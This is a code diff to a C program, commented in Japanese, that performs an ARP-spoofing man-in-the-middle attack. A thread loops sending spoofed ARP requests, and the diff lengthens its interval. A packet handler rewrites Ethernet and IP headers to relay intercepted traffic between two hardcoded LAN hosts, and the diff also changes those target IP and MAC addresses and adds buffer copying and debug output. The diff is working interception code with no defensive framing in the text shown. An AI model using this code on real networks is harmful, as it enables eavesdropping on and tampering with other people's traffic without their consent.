@@ -30,7 +30,8 @@ typedef struct	{
 //ここは手動で変える必要がある！
 //PARAM	Param={"enp4s0","lo",1, "192.168.1.4", "192.168.1.110", "A4:5E:60:B7:29:C7", "B8:27:EB:4A:A3:53"};
 //PARAM	Param={"enp4s0","lo",1, "192.168.1.7", "192.168.1.110", "08:00:27:CE:F8:80", "B8:27:EB:4A:A3:53"};
-PARAM	Param={"enp0s3","lo",1, "192.168.1.99", "192.168.1.110", "68:05:CA:06:F6:7B", "B8:27:EB:4A:A3:53"};
+//PARAM	Param={"enp0s3","lo",1, "192.168.1.99", "192.168.1.110", "68:05:CA:06:F6:7B", "B8:27:EB:4A:A3:53"};
+PARAM	Param={"enp0s3","lo",0, "192.168.1.6", "192.168.1.99", "74:03:BD:7F:99:3E", "68:05:CA:06:F6:7B"};
 
 typedef struct    {
     int    soc;
@@ -101,6 +102,8 @@ int AnalyzePacket(int deviceNo,u_char *data,int size)
     ptr+=sizeof(struct ether_header);
     lest-=sizeof(struct ether_header);
     DebugPrintf("[%d]",deviceNo);
+    
+    
     if(Param.DebugOut){
         PrintEtherHeader(eh,stderr);
     }
@@ -187,6 +190,7 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         //AからBへの通信のときは、IPアドレスとMACアドレスを入れ替えとく。
         if(iphdr->saddr == send_ip && iphdr->daddr == rec_ip){
             DebugPrintf("[%d]recv:MITM IP PACKET:%dbytes\n",deviceNo,size);
+            printf("MITM IP PACKET\n");
             int ii=0;
             //宛先は普通に端末BのMACアドレス
             for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = rec_mac[ii];
@@ -229,11 +233,12 @@ int MITMBridge(in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_
                         perror("read");
                     }
                     else{
-                        //TODO:この辺で、イーサヘッダとIPヘッダを書き換えて、MITMブリッジをする
                         if(AnalyzePacket(deviceNo,buf,size)!=-1){
-                            //MITMパケットの場合だけ送る
-                            if(proccessMITMPacket(deviceNo, buf, size, send_ip, send_mac, rec_ip, rec_mac) ){
-                                if((size=write(Device[deviceNo].soc,buf,size))<=0){
+                            u_char tmpBuf[2048];
+                            memcpy(tmpBuf, buf, size);
+                            //MITMパケットの場合だけ書き換えて送る
+                            if(proccessMITMPacket(deviceNo, tmpBuf, size, send_ip, send_mac, rec_ip, rec_mac) ){
+                                if((size=write(Device[deviceNo].soc, tmpBuf,size))<=0){
                                     perror("write");
                                 }
                             }
@@ -459,7 +464,7 @@ void *arpspoof(void *p){
     struct argArp  *arg = (struct argArp *)p;
     while(1){
         SendArpRequestB(arg->soc, arg->ip_d, arg->mac_d, arg->ip_s, arg->mac_s);
-        usleep(1*1000000);    
+        usleep(10*1000000);    
     }
 
     return (NULL);
